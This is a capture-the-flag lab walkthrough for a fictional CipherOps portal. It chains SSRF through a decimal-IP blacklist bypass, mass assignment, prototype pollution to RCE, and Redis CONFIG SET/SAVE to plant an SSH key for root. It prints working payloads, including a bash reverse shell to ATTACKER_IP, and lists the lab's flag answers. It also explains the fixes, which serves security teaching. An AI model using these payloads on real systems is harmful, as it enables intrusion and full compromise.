# CipherOps Internal Portal — Complete Exploitation Walkthrough

**Difficulty:** Insane  
**Flags:** 4 total, format `VulnOs{...}`  
**Attack chain:** SSRF → Mass Assignment → Prototype Pollution/RCE → Redis Privilege Escalation

---

## Table of Contents

1. [Lab Overview and Architecture](#1-lab-overview-and-architecture)
2. [Setting Up Your Attack Environment](#2-setting-up-your-attack-environment)
3. [Phase 1 — Server-Side Request Forgery (SSRF)](#3-phase-1--server-side-request-forgery-ssrf)
4. [Phase 2 — Mass Assignment via the Internal API](#4-phase-2--mass-assignment-via-the-internal-api)
5. [Phase 3 — Prototype Pollution leading to Remote Code Execution](#5-phase-3--prototype-pollution-leading-to-remote-code-execution)
6. [Phase 4 — Redis Privilege Escalation to Root](#6-phase-4--redis-privilege-escalation-to-root)
7. [Concepts Reference](#7-concepts-reference)

---

## 1. Lab Overview and Architecture

Before touching anything, it helps to understand what the lab is simulating and why each component exists.

CipherOps is a fictional cybersecurity firm. They have built a "Secure File Vault" — a web application where their consultants log in, manage documents, and generate reports. The application looks professional from the outside. It has a login page, a contact form, and a front page showing a LinkedIn profile preview feature. Everything about the UI is designed to look like a real internal corporate tool.

Behind the scenes there are five Docker containers running on the same internal network. They are:

- **Nginx** — the public-facing web server on port 80. All traffic from the browser goes through here first. Nginx routes requests to the Next.js frontend or the Express backend depending on the URL path.
- **frontend** — a Next.js application running on port 3000. This is what you see in the browser. It is the "front door."
- **backend** — a Node.js Express API running on port 8080. This is where all business logic lives: authentication, session management, report generation, and the URL preview feature.
- **redis** — a Redis server running on port 6379 with no password and no access controls. It also runs OpenSSH on port 22, which is exposed to the host on port 2222.
- **postgres** — a PostgreSQL database on port 5432 containing fake consultant account records. This is a distraction.

The only port exposed to the public internet is port 80 (through Nginx). Port 2222 (Redis SSH) is also opened on the firewall to allow the final privilege escalation step.

The critical architectural flaw is that Nginx does not restrict access to the internal backend API routes. The route `/api/v1/internal/debug` is intended to be reachable only from within the server itself. But because Nginx blindly forwards all `/api/v1/` traffic to the backend without any path-based deny rules, a player who can reach the backend from localhost can ultimately reach these internal routes from the outside too — through the SSRF chain.

---

## 2. Setting Up Your Attack Environment

You need the following tools on your attacking machine:

- `curl` — for making HTTP requests from the command line
- A terminal with `redis-cli` installed, or the ability to install it (`apt install redis-tools` on Debian/Ubuntu)
- `ssh-keygen` — standard on any Linux/Mac machine
- A netcat listener for catching reverse shells: `nc -lvnp 4444`

Set a shell variable for the lab's IP address so you do not have to retype it constantly:

```bash
TARGET="<the GCP external IP of the lab VM>"
```

Confirm the lab is running:

```bash
curl -s http://$TARGET/
```

You should see the CipherOps portal HTML. If you view the page source in your browser, look at the HTML comments near the `<head>` tag — there is a developer note that was accidentally left in:

```html
<!-- TODO: remove before go-live – debug service still running on internal port 6666 -->
<!-- internal api path: /api/v1/internal/debug -->
```

This is an intentional hint. In a real engagement you would find breadcrumbs like this in source code, Git history, or error messages. It tells you two things: there is an internal service on port 6666, and there is a sensitive API path at `/api/v1/internal/debug`. You cannot reach either of these from outside the server directly. That is where SSRF comes in.

---

## 3. Phase 1 — Server-Side Request Forgery (SSRF)

**Flag location:** returned in the JSON body of the internal debug server response  
**Flag:** `VulnOs{ssrf_bypassed_bl4ckl1st_w1th_d3c1m4l_1p}`

### What is SSRF?

Server-Side Request Forgery is a vulnerability where you, as a client, trick a server into making an HTTP request on your behalf to a destination of your choosing. The key word is "server-side." Instead of YOUR browser fetching the URL, the SERVER fetches it.

Why does this matter? Because the server is running inside a private network. It can reach internal services that you, sitting on the internet, absolutely cannot. When you submit a URL to the preview feature and the server dutifully fetches it, you have essentially borrowed the server's network position. You can now probe its localhost, its internal Docker network, and any services listening on loopback addresses that were never meant to be exposed.

In this lab: when the backend fetches your supplied URL, the request originates from inside the backend container. That container's `127.0.0.1` is exactly where the secret debug server is listening on port 6666.

### The Feature and the Vulnerability

The front page has a "Consultant Profile Preview" section. It asks for a LinkedIn URL and submits it to:

```
POST /api/v1/preview
Content-Type: application/json

{ "url": "https://linkedin.com/in/some-profile" }
```

The backend (`backend/routes/preview.js`) handles this by:
1. Taking the raw URL string from `req.body.url`
2. Checking it against a blacklist
3. If it passes, using `axios.get(url)` to fetch it and returning the response body

Here is the vulnerable blacklist check (simplified):

```javascript
const IP_BLACKLIST = ['127.0.0.1', 'localhost', '0.0.0.0', '::1', ...];

function isBlocked(rawUrl) {
  const lower = rawUrl.toLowerCase();
  return IP_BLACKLIST.some(entry => lower.includes(entry));
}
```

The fatal mistake: this check operates on the **raw URL string as typed**. It is a simple substring search. It does not parse the URL, it does not resolve the hostname, it does not normalise the IP address. It just looks for the literal strings `127.0.0.1` and `localhost` somewhere in what you typed.

### The Bypass: Decimal IP Encoding

IP addresses are just 32-bit integers. The address `127.0.0.1` is a human-readable dotted-decimal representation of that integer. The actual number is:

```
127 * 16777216  =  2130706432
  0 * 65536     =  0
  0 * 256       =  0
  1 * 1         =  1
Total           =  2130706433
```

So `2130706433` and `127.0.0.1` are exactly the same address. Every major operating system and networking library understands both representations.

The server's blacklist checks for the literal string `"127.0.0.1"`. The string `"2130706433"` does not contain `"127.0.0.1"` as a substring, so it passes the check. But when `axios.get("http://2130706433:6666/")` is called, Node.js uses the WHATWG URL parser, which normalises `2130706433` to `127.0.0.1` before making the TCP connection. The request succeeds.

Other equivalent bypasses (pick any):
- `http://0x7f000001:6666/` — hexadecimal notation
- `http://0177.00.00.01:6666/` — mixed octal-decimal notation  
- `http://[::ffff:127.0.0.1]:6666/` — IPv4-mapped IPv6 address

### Exploiting the SSRF

Send this request:

```bash
curl -s -X POST http://$TARGET/api/v1/preview \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433:6666/"}'
```

The response will be something like:

```json
{
  "url": "http://2130706433:6666/",
  "status": 200,
  "contentType": "application/json; charset=utf-8",
  "body": {
    "service": "CipherOps Internal Debug API",
    "flag": "VulnOs{ssrf_bypassed_bl4ckl1st_w1th_d3c1m4l_1p}",
    "warning": "This service is INTERNAL ONLY and must not be reachable externally.",
    "routes": {
      "public": ["POST /api/v1/preview", "POST /api/v1/auth/login", ...],
      "internal": [
        "GET  /api/v1/internal/debug  – view session + system logs",
        "PUT  /api/v1/internal/debug  – update session properties  [MASS ASSIGNMENT SINK]"
      ],
      "admin": [
        "POST /api/v1/report/generate – generate report  [PROTOTYPE POLLUTION SINK]"
      ]
    }
  }
}
```

You now have Flag 1, a full route map of the backend, and a clear hint: `PUT /api/v1/internal/debug` is a mass assignment sink. That is Phase 2.

---

## 4. Phase 2 — Mass Assignment via the Internal API

**Flag location:** returned in the JSON response body of a successful PUT to `/api/v1/internal/debug`  
**Flag:** `VulnOs{m4ss_4ss1gnm3nt_1s_4dm1n_now}`

### What is Mass Assignment?

Mass assignment is what happens when an application takes data supplied by a user and copies it directly onto an internal object without checking which fields are allowed to be changed. The classic analogy: imagine a web form for updating your user profile. You can change your name and email. But the user record in the database also has a field called `is_admin`. If the backend does:

```javascript
Object.assign(userRecord, req.body)
```

...and you include `"is_admin": true` in your request body alongside your name and email, you just promoted yourself to admin. The developer never intended for that. They assumed users would only send name and email. They forgot to whitelist the allowed fields.

In this lab, the same pattern exists on the session object.

### How Sessions Work Here

When you first visit the site, the backend creates a session for you and stores a user object in it:

```javascript
req.session.user = {
  username:  'guest',
  role:      'guest',
  is_admin:  false,
  clearance: 0
};
```

This session is identified by a cookie in your browser. Every subsequent request you make carries that cookie, and the server looks up your session to know who you are and what permissions you have.

The session is stored in the server's memory (in-process, not in Redis or a database for this lab). It persists across requests as long as you send the same cookie.

### The Vulnerable Endpoint

The route at `PUT /api/v1/internal/debug` does this:

```javascript
router.put('/debug', (req, res) => {
  // VULNERABLE: no field-level whitelist
  Object.assign(req.session.user, req.body);

  const responseBody = {
    message: 'Session properties updated.',
    user:    req.session.user
  };

  if (req.session.user.is_admin === true) {
    responseBody.flag = 'VulnOs{m4ss_4ss1gnm3nt_1s_4dm1n_now}';
  }

  return res.json(responseBody);
});
```

`Object.assign` copies every key from `req.body` into `req.session.user`. There is no check saying "only allow username changes" or "reject any modification to is_admin." Whatever you send is blindly merged in.

### Why Can You Reach This Route?

Remember from Phase 1: Nginx forwards all `/api/v1/` traffic to the backend. The misconfiguration in `nginx.conf` is that there is no `deny` rule for `/api/v1/internal/`. A correctly secured config would have:

```nginx
location /api/v1/internal/ {
    deny all;
}

location /api/v1/ {
    proxy_pass http://backend:8080/api/v1/;
}
```

Because that `deny` block is missing, the route is publicly reachable despite being labelled "internal."

### Exploiting the Mass Assignment

First, you need a session cookie. Visit the site in your browser once, or make any request with `curl -c cookiejar.txt` to capture the session cookie:

```bash
curl -s -c cookiejar.txt http://$TARGET/api/v1/auth/session
```

Now send the escalation request using that cookie:

```bash
curl -s -b cookiejar.txt -c cookiejar.txt \
  -X PUT http://$TARGET/api/v1/internal/debug \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true}'
```

Response:

```json
{
  "message": "Session properties updated.",
  "user": {
    "username": "guest",
    "role": "guest",
    "is_admin": true,
    "clearance": 0
  },
  "flag": "VulnOs{m4ss_4ss1gnm3nt_1s_4dm1n_now}",
  "hint": "Admin unlocked. POST /api/v1/report/generate is now available."
}
```

Your session cookie now represents an admin user. As long as you keep sending that cookie, every future request is treated as admin. Reload the dashboard in your browser (with devtools open to copy the cookie) and you will see the "Admin Panel" button appear, linking to the Report Generator. That is Phase 3.

---

## 5. Phase 3 — Prototype Pollution leading to Remote Code Execution

**Flag location:** `/var/www/flag2.txt` inside the backend container (read after gaining a shell)  
**Flag:** `VulnOs{pr0t0_p0llut10n_2_rc3_ch41n}`

This is the most technically deep step. Read slowly.

### JavaScript Prototypes — the foundation you need to understand

JavaScript is a prototype-based language. Every object in JavaScript has an internal link to another object called its "prototype." When you access a property on an object and that property does not exist directly on the object, JavaScript automatically walks up the prototype chain looking for it.

Here is a concrete example:

```javascript
const myObj = {};
console.log(myObj.toString); // finds toString on Object.prototype
```

`myObj` itself has no `toString` method. But JavaScript finds it on `Object.prototype` — the root prototype that almost every object in the JavaScript runtime inherits from.

Now the dangerous part. In JavaScript, prototypes are just regular objects, and they can be modified at runtime:

```javascript
Object.prototype.isEvil = true;

const a = {};
const b = {};
console.log(a.isEvil); // true — even though a never had this property
console.log(b.isEvil); // true — same for b
```

If you add a property to `Object.prototype`, that property appears on EVERY object in the entire program that does not explicitly shadow it. This is called **prototype pollution**. You are not modifying a specific object — you are modifying the global root that everything inherits from.

In this lab, the prototype we care about is `Object.prototype`. If we can write to it, we can make arbitrary properties appear on any plain object anywhere in the running Node.js process.

### How the Vulnerability Appears in Code

The Report Generator endpoint uses a library called `merge-deep` version 3.0.2. This library performs a deep recursive merge of two objects, similar to `Object.assign` but for nested structures.

The vulnerable code in `backend/routes/report.js` is:

```javascript
const mergeDeep = require('merge-deep');
const config    = require('../config');

router.post('/generate', (req, res) => {
  // ...admin check...

  mergeDeep(config, req.body.options);  // <-- VULNERABLE LINE

  res.json({ status: 'queued', ... });
});
```

`merge-deep@3.0.2` has a known prototype pollution vulnerability. When it processes an object that contains the key `"__proto__"`, instead of treating `__proto__` as a normal string key and safely ignoring it, it follows JavaScript's prototype lookup rules and literally assigns properties onto `Object.prototype`.

So when you send:

```json
{
  "options": {
    "__proto__": {
      "shell": "bash",
      "shellArgs": ["-c", "id > /tmp/pwned"]
    }
  }
}
```

The library does the equivalent of:

```javascript
Object.prototype.shell     = "bash";
Object.prototype.shellArgs = ["-c", "id > /tmp/pwned"];
```

Now `shell` and `shellArgs` exist on every plain object in the Node.js process, including the `config` object imported from `config.js`.

### The RCE Sink — the Cleanup Cron

Prototype pollution by itself only lets you write values. You need something that *reads* those values and acts on them. That is the cleanup scheduler in `server.js`, which runs every 30 seconds:

```javascript
const { spawn } = require('child_process');
const config    = require('./config');

setInterval(() => {
  const shell     = config.shell     || 'sh';
  const shellArgs = config.shellArgs || ['-c', 'echo "[cron] cleanup ok"'];
  const envExtra  = config.env       || {};

  const proc = spawn(shell, shellArgs, {
    env:      { ...process.env, ...envExtra },
    detached: true,
    stdio:    'ignore'
  });
  proc.unref();
}, 30_000);
```

Before pollution: `config.shell` is `undefined` (the `config` object is empty), so it falls back to `'sh'`, and `config.shellArgs` falls back to the benign echo command.

After pollution: `config.shell` resolves to `"bash"` via the prototype chain, and `config.shellArgs` resolves to your payload. The `spawn` call runs your command as the same user as the Node.js process.

### Exploiting It

Start your listener on your attacking machine:

```bash
nc -lvnp 4444
```

Send the payload (using the admin session cookie from Phase 2):

```bash
# Replace ATTACKER_IP with your machine's public IP
curl -s -b cookiejar.txt \
  -X POST http://$TARGET/api/v1/report/generate \
  -H "Content-Type: application/json" \
  -d '{
    "reportType": "pentest",
    "options": {
      "__proto__": {
        "shell":     "bash",
        "shellArgs": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
      }
    }
  }'
```

Within 30 seconds (the cron interval), your netcat listener will receive a connection. You are now inside the `cipherops-backend` container as `www-data` (or `node`).

Read the flag:

```bash
cat /var/www/flag2.txt
# VulnOs{pr0t0_p0llut10n_2_rc3_ch41n}
```

Take a moment to look around. Notice that the Redis server is reachable:

```bash
# Check the internal network — Redis is at hostname "redis" or its Docker IP
env | grep REDIS
# REDIS_HOST=redis
# REDIS_PORT=6379
```

You can install redis-cli or use node directly to talk to Redis. That leads to Phase 4.

---

## 6. Phase 4 — Redis Privilege Escalation to Root

**Flag location:** `/root/root.txt` inside the Redis container  
**Flag:** `VulnOs{r3d1s_rw_2_ssh_k3y_r00t_pwn3d}`

### What Redis Is and Why This Works

Redis is an in-memory data store. It is most commonly used as a cache or message queue. It is designed for internal, trusted networks — its default configuration has no authentication, because the assumption is that only your own application can reach it.

In this lab (and in countless real-world deployments), Redis is:
1. Running with no password (`requirepass` not set)
2. Bound to all interfaces (`bind 0.0.0.0`) rather than localhost only
3. Running as the `root` user inside the container

This combination is catastrophic because Redis has two commands that let it write arbitrary content to arbitrary files on the filesystem: `CONFIG SET` and `SAVE`.

Here is how those commands are normally used:
- `CONFIG SET dir /some/path` — changes the directory where Redis writes its database file
- `CONFIG SET dbfilename myfile.rdb` — changes the filename of the database file
- `SAVE` — forces Redis to write its in-memory data to disk right now

By combining these with data you inject into the in-memory store using `SET`, you can force Redis to write a file containing arbitrary content to any path that the Redis process has write access to. Since Redis runs as `root` in this container, it can write to `/root/.ssh/`, which is the root user's SSH authorised keys directory.

### The SSH Authorised Keys Technique

SSH public key authentication works like this:
1. You generate a key pair: a private key (kept secret by you) and a public key (shared freely)
2. You add your public key to a file called `~/.ssh/authorized_keys` on the target machine
3. When you SSH in, the server checks if your private key corresponds to any public key in that file
4. If it matches, you are authenticated — no password needed

The attack lets you plant your public key into `/root/.ssh/authorized_keys` on the Redis container. After that, you can SSH in as root using your private key.

### The RDB File Format Problem

Redis's `SAVE` command writes the database in a binary format called RDB. The file will contain your injected data (your public key) but it will also contain RDB header bytes, metadata, and checksums. This makes the file "dirty" — it is not a clean list of SSH keys.

However, SSH's `authorized_keys` parser is only looking for lines that look like public keys. It ignores everything it does not recognise. The RDB binary garbage at the beginning of the file is simply skipped. As long as your key appears on its own line in the file with a blank line before and after it (so it does not accidentally get merged with surrounding binary data), SSH will find and accept it.

This is why you pad your key with newlines when injecting it:

```bash
SET crackit "\n\n\n<your-public-key>\n\n\n"
```

### Step-by-Step Exploitation

On your attacking machine, generate a fresh key pair:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/redis_root -N ""

# /tmp/redis_root      ← your private key (keep this)
# /tmp/redis_root.pub  ← your public key (this goes into authorized_keys)
```

Read your public key:

```bash
PUBKEY=$(cat /tmp/redis_root.pub)
```

From your shell inside the backend container (obtained in Phase 3), install redis-cli or use bash TCP redirection. The simplest approach is installing it:

```bash
# inside the backend container shell
apk add redis  # Alpine-based container
# or
apt-get install -y redis-tools  # Debian-based
```

Now run the injection sequence. The Redis server is at hostname `redis` on port 6379:

```bash
redis-cli -h redis -p 6379 CONFIG SET dir /root/.ssh
redis-cli -h redis -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h redis -p 6379 SET crackit $'\n\n'"$PUBKEY"$'\n\n'
redis-cli -h redis -p 6379 SAVE
```

Alternatively, if you cannot install redis-cli, you can talk to Redis using raw TCP (Redis uses a plain-text protocol called RESP):

```bash
# Using bash's /dev/tcp
exec 3<>/dev/tcp/redis/6379
echo -e "CONFIG SET dir /root/.ssh\r" >&3
echo -e "CONFIG SET dbfilename authorized_keys\r" >&3
printf "SET crackit \"\n\n$PUBKEY\n\n\"\r\n" >&3
echo -e "SAVE\r" >&3
cat <&3 &
exec 3>&-
```

Verify the key was written (from your shell inside backend):

```bash
redis-cli -h redis keys '*'
# should show "crackit"
```

Now from your attacking machine, SSH directly to the lab VM on port 2222 (which maps to port 22 of the Redis container):

```bash
ssh -i /tmp/redis_root -p 2222 root@$TARGET
```

If the key was injected correctly, you land in a root shell inside the Redis container. Read the final flag:

```bash
cat /root/root.txt
# VulnOs{r3d1s_rw_2_ssh_k3y_r00t_pwn3d}
```

You have completed the full attack chain.

---

## 7. Concepts Reference

This section explains each vulnerability class in more depth for anyone who wants to study the underlying theory.

---

### Server-Side Request Forgery (SSRF)

SSRF belongs to the OWASP Top 10 and has caused significant real-world breaches, including the 2019 Capital One breach.

The core issue is that web applications frequently need to make outbound HTTP requests — to fetch metadata, preview links, call webhooks, download images, and so on. When a user can control the URL for one of these requests, they can redirect the server's request anywhere: internal services, cloud metadata endpoints, other hosts on the internal network, or localhost.

**Why URL blacklists almost always fail:**  
The set of strings that represent `127.0.0.1` is effectively infinite:
- Decimal: `2130706433`
- Hex: `0x7f000001`
- Octal: `0177.0.0.1`
- IPv4-mapped IPv6: `::ffff:127.0.0.1`
- Short form: `127.1`
- DNS rebinding: a domain that temporarily resolves to `127.0.0.1`

Blacklists try to enumerate the bad cases. Allowlists (only allow specific known-good domains) are the correct defence.

**The correct fix:**
- Maintain a strict allowlist of permitted domains/IPs
- After resolving the hostname to an IP, re-check that IP against a list of forbidden ranges (RFC 1918 private addresses, loopback, link-local)
- Do not return the raw response body to the client — if you must preview URLs, only return safe metadata like the page title

---

### Mass Assignment

This vulnerability is also called "Insecure Mass Assignment" or "Auto-binding." It appears in many frameworks that try to be convenient by automatically mapping request parameters to model objects.

The problem is cleanly described by its name. When you "mass assign" all fields from user input to an internal data structure, you give the user control over every field in that structure — including privileged ones they were never supposed to touch.

Famous real-world example: GitHub had a mass assignment vulnerability in 2012. A researcher added his SSH key to the organisation that owns Rails by exploiting it.

**Why `Object.assign(target, req.body)` is dangerous:**  
`Object.assign` in JavaScript copies every enumerable own property from the source to the target. If `req.body` contains `{ "is_admin": true }` and the target object has an `is_admin` field, it gets overwritten. There is no filter, no validation, no concept of "this field is privileged."

**The correct fix:**
- Explicitly whitelist the fields you allow users to modify
- Use a pattern like: `const allowedFields = ['username', 'email']; allowedFields.forEach(f => { if (req.body[f]) user[f] = req.body[f]; });`
- In production applications, use a DTO (Data Transfer Object) pattern or a validation library that strips unrecognised fields before they reach your internal models

---

### Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability class. It has been discovered in many widely used libraries including lodash, jQuery, and merge operators of all kinds.

**The prototype chain, revisited:**  
Every object's prototype is another object. That prototype has a prototype too. This chain continues until you hit `null` — the end of the chain. The second-to-last object in the chain for any plain object created with `{}` is always `Object.prototype`. So when you write a property to `Object.prototype`, it becomes visible on every plain object in the VM.

**How `__proto__` enables this:**  
In JavaScript, `__proto__` is a special accessor property on `Object.prototype` whose getter/setter directly reads and writes an object's internal prototype link. So `obj.__proto__` does not mean "an object property named `__proto__`" — it means "the prototype of `obj`." When a library does:

```javascript
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, JSON.parse('{"__proto__": {"evil": true}}'));
```

The recursion ends up calling `merge(target.__proto__, {"evil": true})`, which means `merge(Object.prototype, {"evil": true})`. The next assignment sets `Object.prototype.evil = true`. Every object in the program now has `evil: true`.

**Why it leads to RCE:**  
Pollution by itself just sets values. The RCE comes from a "gadget" — a piece of code elsewhere in the application that reads a property from a plain object and uses it in a dangerous way. In this lab the gadget is:

```javascript
const shell     = config.shell     || 'sh';
const shellArgs = config.shellArgs || [...];
spawn(shell, shellArgs, ...);
```

`config` is a plain empty object. When `config.shell` is accessed, JavaScript finds nothing on `config` itself, then walks up to `Object.prototype`, and finds the attacker's value there. The `spawn` call uses it directly.

**The correct fix:**
- Pin all dependencies and keep them updated
- When merging user-supplied data, use `Object.create(null)` for intermediate objects (these have no prototype chain and are immune)
- Freeze `Object.prototype` in sensitive applications: `Object.freeze(Object.prototype)`
- Validate that user-supplied JSON does not contain `__proto__`, `constructor`, or `prototype` as keys before merging

---

### Redis Privilege Escalation (Redis to Root)

This technique has been known since at least 2015 and is still found in production deployments regularly. The CVE is not for a Redis bug — the behaviour (`CONFIG SET`, `SAVE`) is intentional and documented. The vulnerability is misconfiguration.

**Why Redis should never run as root:**  
Any process can only write to files it has permission to write. If Redis runs as a dedicated low-privilege user (like `redis:redis`), the worst it can do is overwrite its own data files. Running Redis as root means that the ability to make Redis write arbitrary files is equivalent to root write access on the entire filesystem.

**Why authentication matters:**  
Redis's `requirepass` setting blocks all commands until the client sends `AUTH <password>`. Without it, any client that can reach port 6379 — including an attacker who found an SSRF or obtained a shell on a machine in the same network — can immediately run `CONFIG SET` and `SAVE`.

**Why `bind 0.0.0.0` matters:**  
By default, Redis should listen only on `127.0.0.1`. If the backend needs to talk to Redis and they are on the same host, loopback is sufficient. If they are on different Docker containers, bind to the internal Docker network interface — not `0.0.0.0`. Binding to `0.0.0.0` means Redis is reachable on every network interface, including the one facing the internet.

**Why `StrictModes no` matters for SSH:**  
OpenSSH by default checks the permissions and ownership of `~/.ssh/` and `authorized_keys`. If those files are not owned by the correct user, or if they have too-permissive permissions, SSH refuses to use them. An RDB file written by Redis will have permissions set by Redis, not by the SSH daemon. `StrictModes no` disables those checks, allowing SSH to accept the keys regardless of file ownership and permissions.

**The correct fix:**
- Run Redis as a dedicated non-root `redis` user
- Set `requirepass <strong-password>`
- Bind to `127.0.0.1` or the specific internal interface, not `0.0.0.0`
- Use Docker's `--network` options carefully — database containers should not be reachable from the host network
- Disable the `CONFIG` command entirely in production using Redis's `rename-command CONFIG ""` directive

---

## Full Flag Summary

| Phase | Technique | Flag |
|-------|-----------|------|
| 1 | SSRF with decimal IP bypass | `VulnOs{ssrf_bypassed_bl4ckl1st_w1th_d3c1m4l_1p}` |
| 2 | Mass Assignment on session | `VulnOs{m4ss_4ss1gnm3nt_1s_4dm1n_now}` |
| 3 | Prototype Pollution to RCE | `VulnOs{pr0t0_p0llut10n_2_rc3_ch41n}` |
| 4 | Redis to Root via SSH key injection | `VulnOs{r3d1s_rw_2_ssh_k3y_r00t_pwn3d}` |

---

## What a Real Attacker Does Differently

This walkthrough has been linear and clearly labelled. A real engagement has none of that. Some practical notes on methodology:

**Reconnaissance comes first.** Before touching any form or API, you spend time mapping the surface: look at every page's source, check response headers, enumerate JavaScript bundles for hardcoded API paths, look in robots.txt, and run a subfinder or directory bruteforce against the host.

**The SSRF chain is the hardest step to piece together.** In the real world, finding that there is an internal service on port 6666 requires actually probing internal ports through the SSRF — sending requests to `http://2130706433:6666/`, `http://2130706433:8080/`, `http://2130706433:5432/`, etc. and observing which ones return content vs. time out. Port scanning via SSRF is slow and tedious.

**The mass assignment requires chaining two facts.** You need to know that (a) there is an internal API path and (b) that path handles PUT requests and reflects the body. Neither of those is obvious without the SSRF step providing the route map.

**Prototype pollution requires knowing the stack.** You need to identify what JavaScript library is being used for merging objects and whether that version is vulnerable. In a real engagement you might find `package.json` exposed, or observe specific merge behaviour through trial and error, or recognise the error messages as belonging to a specific library version.

**Redis escalation requires patience.** Writing the file takes a second. SSH then trying the key immediately sometimes fails because the RDB write is still in progress. Give it two to three seconds after `SAVE` before attempting SSH.

The entire chain from initial access to root can be completed in under 30 minutes by an experienced practitioner. For someone learning these concepts for the first time, budget several hours and do not skip the reading.
